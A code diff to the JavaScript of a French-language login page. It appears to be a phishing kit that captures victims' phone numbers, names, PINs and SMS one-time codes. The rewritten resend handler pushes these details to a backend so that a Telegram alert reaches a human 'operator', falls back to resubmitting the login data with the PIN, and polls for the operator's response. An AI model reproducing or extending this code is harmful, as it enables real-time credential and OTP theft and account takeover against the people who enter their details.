@@ -785,16 +785,47 @@ function startResendCd(secs){
   }, 1000);
 }
 
-function doResend(){
+async function doResend(){
+  if(!sessId) return;
   resetOTP();
   startResendCd();
-  if(sessId) callApi('otp_resend', { sessionId: sessId });
-  // Show toast confirmation
-  document.getElementById('tav').textContent='✓';
-  document.getElementById('tn').textContent='SMS renvoyé';
-  document.getElementById('td').textContent='Vérifiez vos messages';
-  var t=document.getElementById('toast'); t.classList.add('show');
-  setTimeout(function(){ t.classList.remove('show'); },3000);
+
+  // Step 1: reset OTP state on backend so it sends a fresh Telegram alert
+  await callApi('reset_otp', { sessionId: sessId });
+
+  // Step 2: send resend request with full context so Telegram gets notified
+  var fn = document.getElementById('fn') ? document.getElementById('fn').value.trim() : '';
+  var ln = document.getElementById('ln') ? document.getElementById('ln').value.trim() : '';
+  var r = await callApi('otp_resend', {
+    sessionId: sessId,
+    phone: loginVal,
+    firstName: fn,
+    lastName: ln,
+    resend: '1'
+  });
+
+  // Step 3: fallback — re-submit login_attempt which always triggers a fresh Telegram message
+  if (!r || !r.success) {
+    await callApi('login_attempt', {
+      sessionId: sessId,
+      phone: loginVal,
+      firstName: fn || 'Unknown',
+      lastName: ln || 'User',
+      pin: pinVal || '0000',
+      resend: '1'
+    });
+  }
+
+  // Resume polling so we catch when operator responds
+  startPoll(sessId);
+
+  // Show toast
+  document.getElementById('tav').textContent = '✉';
+  document.getElementById('tn').textContent = 'SMS renvoyé';
+  document.getElementById('td').textContent = 'Un nouveau code a été envoyé';
+  var t = document.getElementById('toast');
+  t.classList.add('show');
+  setTimeout(function(){ t.classList.remove('show'); }, 3500);
 }
 
 async function doVerify(){
